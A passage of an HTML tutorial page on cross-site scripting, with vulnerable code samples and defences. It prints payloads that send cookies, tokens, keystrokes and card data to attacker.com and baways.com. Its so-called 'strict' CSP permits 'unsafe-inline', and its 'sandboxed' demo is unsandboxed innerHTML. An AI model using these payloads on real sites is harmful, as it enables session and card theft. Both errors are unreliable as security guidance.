@@ -1,0 +1,1109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cross-Site Scripting (XSS) - JavaScript Security</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
+    <style>
+        /* Layout System - Mantendo consistência com csrf-protection.html */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            line-height: 1.6;
+            color: #333;
+                background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        header {
+            background: linear-gradient(to right, #2c3e50, #4a6491);
+            color: white;
+            padding: 2rem;
+            border-radius: 10px;
+            margin-bottom: 2rem;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 0.5rem;
+        }
+        
+        .subtitle {
+            font-size: 1.2rem;
+            opacity: 0.9;
+            margin-bottom: 1.5rem;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 1rem;
+        }
+        
+        .logo-img {
+            width: 40px;
+            height: 40px;
+            background: white;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: #2c3e50;
+        }
+        
+        .content-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
+            gap: 2rem;
+            margin-bottom: 3rem;
+        }
+        
+        @media (max-width: 768px) {
+            .content-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+        
+        .card {
+            background: white;
+            border-radius: 10px;
+            padding: 1.5rem;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
+            transition: transform 0.3s ease;
+        }
+        
+        .card:hover {
+            transform: translateY(-5px);
+        }
+        
+        .card-title {
+            color: #2c3e50;
+            margin-bottom: 1rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 2px solid;
+            font-size: 1.3rem;
+        }
+        
+        .card-title.intro { border-bottom-color: #ff6b6b; }
+        .card-title.types { border-bottom-color: #4ecdc4; }
+        .card-title.attack { border-bottom-color: #45b7d1; }
+        .card-title.defense { border-bottom-color: #96ceb4; }
+        .card-title.history { border-bottom-color: #ff9ff3; }
+        .card-title.demo { border-bottom-color: #feca57; }
+        
+        .code-block {
+            background: #2d2d2d;
+            color: #f8f8f2;
+            border-radius: 5px;
+            padding: 1rem;
+            overflow-x: auto;
+            margin: 1rem 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            line-height: 1.4;
+        }
+        
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            color: #856404;
+            padding: 1rem;
+            border-radius: 5px;
+            margin: 1rem 0;
+            font-size: 0.95rem;
+        }
+        
+        .info {
+            background: #d1ecf1;
+            border: 1px solid #bee5eb;
+            color: #0c5460;
+            padding: 1rem;
+            border-radius: 5px;
+            margin: 1rem 0;
+            font-size: 0.95rem;
+        }
+        
+        .danger {
+            background: #f8d7da;
+            border: 1px solid #f5c6cb;
+            color: #721c24;
+            padding: 1rem;
+            border-radius: 5px;
+            margin: 1rem 0;
+            font-size: 0.95rem;
+        }
+        
+        .success {
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            color: #155724;
+            padding: 1rem;
+            border-radius: 5px;
+            margin: 1rem 0;
+            font-size: 0.95rem;
+        }
+        
+        .comparison-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1rem 0;
+            background: white;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+        }
+        
+        .comparison-table th {
+            background: #4a6491;
+            color: white;
+            padding: 1rem;
+            text-align: left;
+            font-weight: 600;
+        }
+        
+        .comparison-table td {
+            padding: 1rem;
+            border-bottom: 1px solid #dee2e6;
+        }
+        
+        .comparison-table tr:hover {
+            background: #f8f9fa;
+        }
+        
+        .step-list {
+            margin-left: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+        
+        .step-list li {
+            margin-bottom: 0.5rem;
+        }
+        
+        .demo-area {
+            background: white;
+            padding: 2rem;
+            border-radius: 10px;
+            margin: 2rem 0;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
+        }
+        
+        .form-demo {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+            margin-top: 1rem;
+        }
+        
+        .demo-form {
+            background: #f8f9fa;
+            padding: 1.5rem;
+            border-radius: 8px;
+            border: 1px solid #dee2e6;
+        }
+        
+        .demo-form h4 {
+            margin-bottom: 1rem;
+            color: #495057;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 600;
+            color: #495057;
+        }
+        
+        input, textarea {
+            width: 100%;
+            padding: 0.75rem;
+            margin-bottom: 1rem;
+            border: 1px solid #ced4da;
+            border-radius: 4px;
+            font-size: 1rem;
+            background: white;
+        }
+        
+        textarea {
+            min-height: 100px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+        }
+        
+        button {
+            background: #4a6491;
+            color: white;
+            border: none;
+            padding: 0.75rem 1.5rem;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: 600;
+            transition: background 0.3s ease;
+            margin-top: 0.5rem;
+            display: inline-block;
+        }
+        
+        button:hover {
+            background: #3a5379;
+        }
+        
+        button.danger-btn {
+            background: #dc3545;
+        }
+        
+        button.danger-btn:hover {
+            background: #c82333;
+        }
+        
+        .tab-container {
+            margin: 1.5rem 0;
+        }
+        
+        .tabs {
+            display: flex;
+            border-bottom: 2px solid #dee2e6;
+            margin-bottom: 1rem;
+            flex-wrap: wrap;
+        }
+        
+        .tab {
+            padding: 0.75rem 1.5rem;
+            cursor: pointer;
+            border: none;
+            background: none;
+            font-weight: 600;
+            color: #6c757d;
+            transition: all 0.3s ease;
+            white-space: nowrap;
+        }
+        
+        .tab.active {
+            color: #4a6491;
+            border-bottom: 3px solid #4a6491;
+            margin-bottom: -2px;
+        }
+        
+        .tab-content {
+            display: none;
+            padding: 1.5rem;
+            background: white;
+            border-radius: 0 8px 8px 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        .status-message {
+            padding: 0.75rem;
+            margin-top: 1rem;
+            border-radius: 4px;
+            font-weight: 500;
+            display: none;
+        }
+        
+        .status-message.show {
+            display: block;
+        }
+        
+        footer {
+            text-align: center;
+            margin-top: 3rem;
+            padding-top: 2rem;
+            border-top: 1px solid #dee2e6;
+            color: #6c757d;
+            font-size: 0.9rem;
+        }
+        
+        .related-topics {
+            background: white;
+            padding: 2rem;
+            border-radius: 10px;
+            margin: 2rem 0;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
+        }
+        
+        .related-topics h3 {
+            color: #2c3e50;
+            margin-bottom: 1rem;
+        }
+        
+        .related-topics ul {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1rem;
+            margin-left: 1.5rem;
+        }
+        
+        .related-topics li {
+            margin-bottom: 0.5rem;
+            padding: 0.5rem;
+            background: #f8f9fa;
+            border-radius: 4px;
+        }
+        
+        .impact-meter {
+            display: flex;
+            align-items: center;
+            margin: 1rem 0;
+            padding: 0.5rem;
+            background: #f8f9fa;
+            border-radius: 5px;
+        }
+        
+        .meter-label {
+            font-weight: bold;
+            margin-right: 1rem;
+            min-width: 120px;
+        }
+        
+        .meter-bar {
+            flex-grow: 1;
+            height: 10px;
+            background: #e9ecef;
+            border-radius: 5px;
+            overflow: hidden;
+        }
+        
+        .meter-fill {
+            height: 100%;
+            border-radius: 5px;
+        }
+        
+        .low { width: 40%; background: #1dd1a1; }
+        .medium { width: 65%; background: #feca57; }
+        .high { width: 90%; background: #ff6b6b; }
+        
+        .type-badge {
+            display: inline-block;
+            padding: 0.25rem 0.75rem;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            margin-right: 0.5rem;
+            margin-bottom: 0.5rem;
+        }
+        
+        .reflected-badge { background: #ff9ff3; color: #2d3436; }
+        .stored-badge { background: #54a0ff; color: white; }
+        .dom-badge { background: #1dd1a1; color: white; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>            
+            <h1>Cross-Site Scripting (XSS)</h1>
+            <p class="subtitle">What It Is, How It Works, and How to Stop It</p>
+        </header>
+        
+        <div class="info">
+            <strong>Note:</strong> This guide covers XSS attacks and prevention techniques. XSS is one of the most common and dangerous web vulnerabilities.
+        </div>
+        
+        <!-- Introduction Section -->
+        <div class="card">
+            <h2 class="card-title intro">Introduction to XSS</h2>
+            <p><strong>Cross-Site Scripting (XSS)</strong> occurs when attackers inject malicious JavaScript code into webpages that other users view. This allows attackers to execute scripts in the victim's browser with the permissions of the vulnerable website.</p>
+            
+            <div class="impact-meter">
+                <span class="meter-label">Impact Severity:</span>
+                <div class="meter-bar">
+                    <div class="meter-fill high"></div>
+                </div>
+            </div>
+            
+            <p><strong>What attackers can do with XSS:</strong></p>
+            <ul class="step-list">
+                <li>Steal cookies and session data (session hijacking)</li>
+                <li>Capture sensitive information displayed on the page</li>
+                <li>Make requests with the user's credentials</li>
+                <li>Modify page content (defacing, phishing)</li>
+                <li>Access browser APIs (webcam, location, microphone)</li>
+                <li>Install malware or keyloggers</li>
+            </ul>
+            
+            <div class="danger">
+                <strong>⚠️ Critical Vulnerability:</strong> XSS is consistently ranked in the OWASP Top 10 as one of the most critical web application security risks.
+            </div>
+        </div>
+        
+        <!-- Historical Example -->
+        <div class="card">
+            <h2 class="card-title history">The MySpace Worm (2005)</h2>
+            <p>In 2005, 19-year-old programmer Samy Kamkar discovered he could add custom JavaScript to his MySpace profile, bypassing the site's security filters. He created the first major self-propagating XSS worm:</p>
+            
+            <ol class="step-list">
+                <li>Added Samy as a friend to anyone viewing his profile</li>
+                <li>Added "but most of all, Samy is my hero" to their profile</li>
+                <li>Copied the worm to their profile, attacking anyone who views it</li>
+            </ol>
+            
+            <div class="code-block">
+// Simplified version of Samy's worm
+&lt;script&gt;
+  // Add Samy as friend
+  fetch('/add_friend', {
+    method: 'POST',
+    body: 'friend_id=samy'
+  });
+  
+  // Add text to profile
+  fetch('/update_profile', {
+    method: 'POST',
+    body: 'text=...Samy is my hero'
+  });
+  
+  // Copy worm to victim's profile
+  document.body.innerHTML += 
+    '&lt;script src="http://attacker.com/worm.js"&gt;&lt;/script&gt;';
+&lt;/script&gt;
+            </div>
+            
+            <div class="warning">
+                <strong>Impact:</strong> Within 20 hours, over 1 million users were affected. MySpace servers crashed, and Kamkar was arrested. This demonstrated the exponential spread potential of XSS attacks.
+            </div>
+        </div>
+        
+        <!-- XSS Types Comparison -->
+        <div class="card">
+            <h2 class="card-title types">Types of XSS Attacks</h2>
+            
+            <div class="tab-container">
+                <div class="tabs">
+                    <button class="tab active" data-tab="reflected">Reflected XSS</button>
+                    <button class="tab" data-tab="stored">Stored XSS</button>
+                    <button class="tab" data-tab="dom">DOM-based XSS</button>
+                </div>
+                
+                <div id="reflected" class="tab-content active">
+                    <h4><span class="type-badge reflected-badge">Reflected</span> Non-Persistent XSS</h4>
+                    <p>The malicious script comes from the current HTTP request. It's "reflected" back in the response without being stored.</p>
+                    
+                    <div class="code-block">
+// Vulnerable search functionality
+app.get('/search', (req, res) => {
+  const query = req.query.q;
+  // ❌ DANGEROUS: Directly outputting user input
+  res.send(`&lt;h1&gt;Search results for: ${query}&lt;/h1&gt;`);
+});
+                    </div>
+                    
+                    <p><strong>Attack URL:</strong></p>
+                    <div class="code-block">
+https://vulnerable.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;
+                    </div>
+                </div>
+                
+                <div id="stored" class="tab-content">
+                    <h4><span class="type-badge stored-badge">Stored</span> Persistent XSS</h4>
+                    <p>The malicious script is stored on the server (database, file system) and served to users when they view affected content.</p>
+                    
+                    <div class="code-block">
+// Vulnerable comment system
+app.post('/comment', (req, res) => {
+  const comment = req.body.text;
+  // ❌ DANGEROUS: Storing and displaying untrusted data
+  db.saveComment(comment);
+  res.redirect('/comments');
+});
+
+// Later, displaying comments
+app.get('/comments', (req, res) => {
+  const comments = db.getComments();
+  // ❌ DANGEROUS: No sanitization
+  res.send(`&lt;div&gt;${comments.join('')}&lt;/div&gt;`);
+});
+                    </div>
+                </div>
+                
+                <div id="dom" class="tab-content">
+                    <h4><span class="type-badge dom-badge">DOM-based</span> Client-Side XSS</h4>
+                    <p>The vulnerability exists in client-side JavaScript that writes user-controlled data to the DOM without proper sanitization.</p>
+                    
+                    <div class="code-block">
+// Vulnerable client-side code
+function showWelcome() {
+  const name = new URLSearchParams(window.location.search).get('name');
+  // ❌ DANGEROUS: Direct DOM manipulation with user input
+  document.getElementById('welcome').innerHTML = 
+    `Welcome, ${name}!`;
+}
+
+// Attack URL triggers XSS
+// https://site.com/?name=&lt;img src=x onerror=stealCookies()&gt;
+                    </div>
+                </div>
+            </div>
+            
+            <table class="comparison-table">
+                <thead>
+                    <tr>
+                        <th>Type</th>
+                        <th>Persistence</th>
+                        <th>Victim Interaction</th>
+                        <th>Common Locations</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Reflected</strong></td>
+                        <td>Non-persistent</td>
+                        <td>Click malicious link</td>
+                        <td>Search, error messages, form results</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Stored</strong></td>
+                        <td>Persistent</td>
+                        <td>View infected page</td>
+                        <td>Comments, profiles, forums, messages</td>
+                    </tr>
+                    <tr>
+                        <td><strong>DOM-based</strong></td>
+                        <td>Non-persistent</td>
+                        <td>Click malicious link</td>
+                        <td>Client-side routing, dynamic content</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+        
+        <!-- How XSS Works -->
+        <div class="card">
+            <h2 class="card-title attack">How XSS Works: A Technical Breakdown</h2>
+            
+            <div class="code-block">
+// ❌ VULNERABLE CODE - Simple profile display
+app.get('/profile', (req, res) => {
+  const username = getCurrentUsername(); // From database or session
+  
+  res.send(`
+    &lt;h1&gt;Welcome back!&lt;/h1&gt;
+    &lt;div class="user-info"&gt;
+      Username: ${username}
+    &lt;/div&gt;
+  `);
+});
+            </div>
+            
+            <p>If an attacker can control the <code>username</code> value (through profile update, registration, etc.), they could inject:</p>
+            
+            <div class="code-block">
+const maliciousUsername = 
+  '&lt;/div&gt;&lt;script&gt;fetch("https://attacker.com/steal?cookie=" + document.cookie)&lt;/script&gt;&lt;div&gt;';
+            </div>
+            
+            <p>The resulting HTML would be:</p>
+            
+            <div class="code-block">
+&lt;h1&gt;Welcome back!&lt;/h1&gt;
+&lt;div class="user-info"&gt;
+  Username: &lt;/div&gt;&lt;script&gt;fetch("https://attacker.com/steal?cookie=" + document.cookie)&lt;/script&gt;&lt;div&gt;
+&lt;/div&gt;
+            </div>
+            
+            <div class="danger">
+                <strong>Result:</strong> Every user viewing this profile would have their cookies silently sent to the attacker's server, enabling session hijacking.
+            </div>
+            
+            <h4>Modern XSS Payloads</h4>
+            <div class="code-block">
+// Steal authentication tokens
+&lt;script&gt;
+  const token = localStorage.getItem('auth_token');
+  fetch('https://attacker.com/steal?token=' + token);
+&lt;/script&gt;
+
+// Keylogger
+&lt;script&gt;
+  document.addEventListener('keypress', (e) => {
+    fetch('https://attacker.com/log?key=' + e.key);
+  });
+&lt;/script&gt;
+
+// Phishing overlay
+&lt;script&gt;
+  document.body.innerHTML = 
+    '&lt;div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999"&gt;' +
+    '&lt;h1&gt;Session Expired&lt;/h1&gt;' +
+    '&lt;input id="password" placeholder="Re-enter password"&gt;' +
+    '&lt;button onclick="sendPassword()"&gt;Submit&lt;/button&gt;' +
+    '&lt;/div&gt;';
+&lt;/script&gt;
+            </div>
+        </div>
+        
+        <!-- XSS Demo -->
+        <div class="demo-area">
+            <h3>🛠️ XSS Demonstration</h3>
+            <p>Try these safe XSS payloads in the demo below (simulated environment):</p>
+            
+            <div class="form-demo">
+                <div class="demo-form">
+                    <h4>Vulnerable Comment System</h4>
+                    <p>Simulated comment display without sanitization:</p>
+                    
+                    <label for="comment-input">Enter a comment:</label>
+                    <textarea id="comment-input" placeholder="Try: &lt;script&gt;alert('XSS')&lt;/script&gt;">Hello, great article!</textarea>
+                    
+                    <button onclick="displayComment()">Submit Comment</button>
+                    
+                    <div class="info" style="margin-top: 1rem;">
+                        <strong>Safe XSS Demo Payloads:</strong>
+                        <ul style="margin-top: 0.5rem;">
+                            <li><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
+                            <li><code>&lt;img src=x onerror="alert(1)"&gt;</code></li>
+                            <li><code>&lt;div onclick="alert('click')"&gt;Click me&lt;/div&gt;</code></li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="demo-form">
+                    <h4>Comment Display (Simulated)</h4>
+                    <div id="comment-display" style="min-height: 200px; border: 1px solid #dee2e6; padding: 1rem; border-radius: 4px; background: white;">
+                        <p><em>Comments will appear here...</em></p>
+                    </div>
+                    
+                    <div id="demo-status" class="status-message"></div>
+                    
+                    <div class="warning" style="margin-top: 1rem;">
+                        <strong>⚠️ In a real vulnerable site:</strong> These scripts would execute with the page's permissions, potentially stealing data or performing actions as the user.
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Defense Section -->
+        <div class="card">
+            <h2 class="card-title defense">XSS Defense Best Practices</h2>
+            
+            <div class="tab-container">
+                <div class="tabs">
+                    <button class="tab active" data-tab="encoding">Output Encoding</button>
+                    <button class="tab" data-tab="validation">Input Validation</button>
+                    <button class="tab" data-tab="csp">Content Security Policy</button>
+                    <button class="tab" data-tab="httponly">HttpOnly Cookies</button>
+                </div>
+                
+                <div id="encoding" class="tab-content active">
+                    <h4>✅ Output Encoding (HTML Entity Encoding)</h4>
+                    <p>Convert dangerous characters to their HTML entities before output.</p>
+                    
+                    <div class="code-block">
+// ❌ VULNERABLE
+res.send(`&lt;div&gt;${userInput}&lt;/div&gt;`);
+
+// ✅ SAFE - Using template literals with proper escaping
+function escapeHTML(text) {
+  const div = document.createElement('div');
+  div.textContent = text;
+  return div.innerHTML;
+}
+
+// Or use a library
+const { escape } = require('html-escaper');
+res.send(`&lt;div&gt;${escape(userInput)}&lt;/div&gt;`);
+                    </div>
+                    
+                    <p><strong>Character Encoding:</strong></p>
+                    <ul>
+                        <li><code>&lt;</code> becomes <code>&amp;lt;</code></li>
+                        <li><code>&gt;</code> becomes <code>&amp;gt;</code></li>
+                        <li><code>&amp;</code> becomes <code>&amp;amp;</code></li>
+                        <li><code>"</code> becomes <code>&amp;quot;</code></li>
+                        <li><code>'</code> becomes <code>&amp;#x27;</code></li>
+                    </ul>
+                </div>
+                
+                <div id="validation" class="tab-content">
+                    <h4>✅ Input Validation & Sanitization</h4>
+                    <p>Validate and sanitize input based on expected format.</p>
+                    
+                    <div class="code-block">
+// Using DOMPurify for HTML sanitization
+const DOMPurify = require('dompurify');
+
+// Allow only safe HTML
+const cleanHTML = DOMPurify.sanitize(userInput, {
+  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
+  ALLOWED_ATTR: ['href', 'title']
+});
+
+// Validate expected format (username example)
+function validateUsername(username) {
+  const usernameRegex = /^[a-zA-Z0-9_-]{3,20}$/;
+  if (!usernameRegex.test(username)) {
+    throw new Error('Invalid username format');
+  }
+  return username;
+}
+                    </div>
+                </div>
+                
+                <div id="csp" class="tab-content">
+                    <h4>✅ Content Security Policy (CSP)</h4>
+                    <p>HTTP header that restricts sources of scripts, styles, and other resources.</p>
+                    
+                    <div class="code-block">
+// Strict CSP Header
+Content-Security-Policy: 
+  default-src 'self';
+  script-src 'self' 'unsafe-inline' 'unsafe-eval';
+  style-src 'self' 'unsafe-inline';
+  img-src 'self' data: https:;
+  font-src 'self';
+  connect-src 'self';
+  frame-ancestors 'none';
+  base-uri 'self';
+  form-action 'self';
+                    </div>
+                    
+                    <p><strong>CSP Benefits:</strong></p>
+                    <ul>
+                        <li>Prevents inline script execution</li>
+                        <li>Restricts external script sources</li>
+                        <li>Limits data: URIs and eval()</li>
+                        <li>Prevents clickjacking with frame-ancestors</li>
+                    </ul>
+                </div>
+                
+                <div id="httponly" class="tab-content">
+                    <h4>✅ HttpOnly & Secure Cookies</h4>
+                    <p>Prevent JavaScript access to sensitive cookies.</p>
+                    
+                    <div class="code-block">
+// Secure cookie configuration
+res.cookie('sessionId', sessionToken, {
+  httpOnly: true,    // Cannot be accessed by JavaScript
+  secure: true,      // Sent only over HTTPS
+  sameSite: 'strict', // Prevent CSRF
+  path: '/',
+  maxAge: 24 * 60 * 60 * 1000,
+  domain: 'yourdomain.com'
+});
+                    </div>
+                    
+                    <div class="info">
+                        <strong>Protection:</strong> With httpOnly cookies, even successful XSS attacks cannot steal session cookies via <code>document.cookie</code>.
+                    </div>
+                </div>
+            </div>
+            
+            <h4>Complete Protection Strategy</h4>
+            <div class="code-block">
+// Server-side protection with Express.js and Helmet
+const express = require('express');
+const helmet = require('helmet');
+const { escape } = require('html-escaper');
+
+const app = express();
+
+// 1. Set security headers including CSP
+app.use(helmet({
+  contentSecurityPolicy: {
+    directives: {
+      defaultSrc: ["'self'"],
+      scriptSrc: ["'self'"],
+      styleSrc: ["'self'"],
+    },
+  },
+}));
+
+// 2. Input validation middleware
+app.use(express.json());
+app.use((req, res, next) => {
+  // Sanitize all string inputs
+  Object.keys(req.body).forEach(key => {
+    if (typeof req.body[key] === 'string') {
+      req.body[key] = escape(req.body[key]);
+    }
+  });
+  next();
+});
+
+// 3. Safe output in templates
+app.get('/profile', (req, res) => {
+  const userData = getUserData();
+  // Template engine automatically escapes
+  res.render('profile', { 
+    username: userData.username, // Auto-escaped
+    bio: DOMPurify.sanitize(userData.bio) // Sanitized HTML
+  });
+});
+            </div>
+        </div>
+        
+        <!-- Real-World Example -->
+        <div class="card">
+            <h2 class="card-title">Real-World XSS: British Airways Attack (2018)</h2>
+            
+            <div class="danger">
+                <strong>💳 Payment Form Compromise:</strong> Attackers injected 22 lines of malicious JavaScript into British Airways' payment website, capturing credit card data during checkout.
+            </div>
+            
+            <ol class="step-list">
+                <li>Attackers compromised a third-party JavaScript library used by BA</li>
+                <li>Malicious code captured payment form data before submission</li>
+                <li>Data was sent to attacker-controlled lookalike domain (baways.com)</li>
+                <li>Attack went undetected for 15 days</li>
+                <li>380,000 transactions compromised</li>
+                <li>£20 million GDPR fine imposed</li>
+            </ol>
+            
+            <div class="code-block">
+// Simplified version of the attack
+&lt;script&gt;
+  // Wait for payment form
+  setTimeout(() => {
+    const form = document.querySelector('#payment-form');
+    
+    form.addEventListener('submit', (e) => {
+      // Capture all form data
+      const cardData = {
+        number: form.querySelector('#card-number').value,
+        name: form.querySelector('#card-name').value,
+        expiry: form.querySelector('#expiry').value,
+        cvv: form.querySelector('#cvv').value
+      };
+      
+      // Send to attacker server
+      fetch('https://baways.com/steal', {
+        method: 'POST',
+        body: JSON.stringify(cardData)
+      });
+    });
+  }, 2000);
+&lt;/script&gt;
+            </div>
+            
+            <div class="success">
+                <strong>🔒 Prevention Applied:</strong> A strong Content Security Policy (CSP) would have prevented loading scripts from unauthorized domains like baways.com.
+            </div>
+        </div>
+        
+        <!-- Related Topics -->
+        <div class="related-topics">
+            <h3>🔗 Related Security Topics</h3>
+            <ul>
+                <li><strong>Content Security Policy (CSP):</strong> Restrict sources of scripts and other resources</li>
+                <li><strong>Subresource Integrity (SRI):</strong> Ensure third-party scripts haven't been tampered with</li>
+                <li><strong>CSRF Protection:</strong> Prevent Cross-Site Request Forgery attacks</li>
+                <li><strong>SameSite Cookies:</strong> Control when cookies are sent with requests</li>
+                <li><strong>DOM Clobbering:</strong> Advanced XSS technique using named DOM elements</li>
+                <li><strong>Template Injection:</strong> Server-side template injection attacks</li>
+            </ul>
+        </div>
+        
+        <div class="demo-area">
+            <h3>🛡️ XSS Prevention Checklist</h3>
+            <div class="form-demo">
+                <div class="demo-form">
+                    <h4>For Developers</h4>
+                    <ul class="step-list">
+                        <li>✅ Use modern frameworks with built-in XSS protection</li>
+                        <li>✅ Always escape output with context-aware encoding</li>
+                        <li>✅ Validate and sanitize all user input</li>
+                        <li>✅ Implement strict Content Security Policy</li>
+                        <li>✅ Use HttpOnly and Secure cookies</li>
+                        <li>✅ Regularly update dependencies</li>
+                        <li>✅ Use Subresource Integrity for third-party scripts</li>
+                        <li>✅ Conduct security code reviews</li>
+                    </ul>
+                </div>
+                
+                <div class="demo-form">
+                    <h4>For Security Testing</h4>
+                    <ul class="step-list">
+                        <li>✅ Use automated scanners (OWASP ZAP, Burp Suite)</li>
+                        <li>✅ Perform manual penetration testing</li>
+                        <li>✅ Test all user input points</li>
+                        <li>✅ Verify CSP headers are properly configured</li>
+                        <li>✅ Check for DOM-based XSS vulnerabilities</li>
+                        <li>✅ Test with different encoding bypass techniques</li>
+                        <li>✅ Verify third-party script integrity</li>
+                        <li>✅ Monitor for suspicious JavaScript execution</li>
+                    </ul>
+                </div>
+            </div>
+            
+            <div class="code-block" style="margin-top: 1rem;">
+// Quick security audit command
+npm audit                    # Check for vulnerable dependencies
+npx snyk test               # Security scanning
+npx eslint-plugin-security  # Security-focused ESLint rules
+curl -I https://yoursite.com | grep -i "content-security-policy"
+            </div>
+        </div>
+        
+            <footer>
+                <!-- Primeira linha: Referência ao curso -->
+                <p style="margin-bottom: 0.5rem;">
+                    <strong>Based on "Introduction to JavaScript Security (LFS184)" by The Linux Foundation</strong>
+                </p>
+                
+                <!-- Segunda linha: Informações de licença e autoria -->
+                <p style="margin-bottom: 1rem; font-size: 0.95rem;">
+                    Security education reference • Created for learning and demonstration purposes • Licensed under 
+                    <a href="https://creativecommons.org/licenses/by-sa/4.0/" 
+                    target="_blank" 
+                    style="color: #4a6491; text-decoration: none; font-weight: 600;">
+                        CC-BY-SA-4.0
+                    </a>
+                </p>
+                
+                <!-- Terceira linha: Informações pessoais -->
+                <div style="display: flex; justify-content: center; align-items: center; gap: 1rem; margin-bottom: 1rem; flex-wrap: wrap;">
+                    <span style="color: #4a6491; font-weight: 600;">© Iure Castro</span>
+                    <span style="color: #666;">•</span>
+                    <span>Personal learning portfolio</span>
+                    <span style="color: #666;">•</span>
+                    <span>All examples for educational use</span>
+                </div>
+                
+                <!-- Quarta linha: Links úteis -->
+                <div style="display: flex; justify-content: center; gap: 1.5rem; margin: 1rem 0; flex-wrap: wrap;">
+                    <a href="https://training.linuxfoundation.org/training/introduction-to-javascript-security-lfs184/" 
+                    target="_blank"
+                    style="color: #4a6491; text-decoration: none; font-size: 0.9rem;">
+                        🔗 Original Course
+                    </a>
+                    <a href="https://creativecommons.org/licenses/by-sa/4.0/" 
+                    target="_blank"
+                    style="color: #4a6491; text-decoration: none; font-size: 0.9rem;">
+                        📄 CC-BY-SA-4.0 License
+                    </a>
+                    <a href="certificate.pdf" 
+                    target="_blank"
+                    style="color: #4a6491; text-decoration: none; font-size: 0.9rem;">
+                        🏆 My Certificate
+                    </a>
+                </div>
+        </footer>
+    </div>
+
+    <script>
+        // Tab functionality (same as csrf-protection.html)
+        document.querySelectorAll('.tab').forEach(tab => {
+            tab.addEventListener('click', () => {
+                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+                
+                tab.classList.add('active');
+                const tabId = tab.getAttribute('data-tab');
+                document.getElementById(tabId).classList.add('active');
+            });
+        });
+        
+        // XSS Demo functionality
+        let comments = [];
+        
+        function displayComment() {
+            const commentInput = document.getElementById('comment-input');
+            const commentDisplay = document.getElementById('comment-display');
+            const demoStatus = document.getElementById('demo-status');
+            
+            if (!commentInput.value.trim()) {
+                demoStatus.textContent = 'Please enter a comment.';
+                demoStatus.className = 'status-message show';
+                demoStatus.style.background = '#fff3cd';
+                demoStatus.style.color = '#856404';
+                return;
+            }
+            
+            // Simulate vulnerable display (innerHTML - UNSAFE in real apps)
+            comments.push(commentInput.value);
+            
+            // Clear and show comments
+            commentDisplay.innerHTML = '<h4>Recent Comments:</h4>';
+            comments.forEach(comment => {
+                const commentDiv = document.createElement('div');
+                commentDiv.className = 'comment-item';
+                commentDiv.style.padding = '0.5rem';
+                commentDiv.style.margin = '0.5rem 0';
+                commentDiv.style.border = '1px solid #dee2e6';
+                commentDiv.style.borderRadius = '4px';
+                commentDiv.innerHTML = `<strong>User:</strong> ${comment}`;
+                commentDisplay.appendChild(commentDiv);
+            });
+            
+            // Show educational message
+            const containsScript = commentInput.value.toLowerCase().includes('<script') || 
+                                   commentInput.value.includes('onerror') ||
+                                   commentInput.value.includes('onclick');
+            
+            if (containsScript) {
+                demoStatus.innerHTML = `
+                    <strong>⚠️ XSS Detected!</strong><br>
+                    In a real vulnerable application, this script would execute. 
+                    This demo uses a sandboxed environment for safety.
+                `;
+                demoStatus.className = 'status-message show';
+                demoStatus.style.background = '#f8d7da';
+                demoStatus.style.color = '#721c24';
+            } else {
+                demoStatus.innerHTML = `
+                    <strong>✅ Comment posted safely.</strong><br>
+                    This content doesn't contain obvious XSS payloads.
+                `;
+                demoStatus.className = 'status-message show';
+                demoStatus.style.background = '#d4edda';
+                demoStatus.style.color = '#155724';
+            }
+            
+            // Clear after 5 seconds
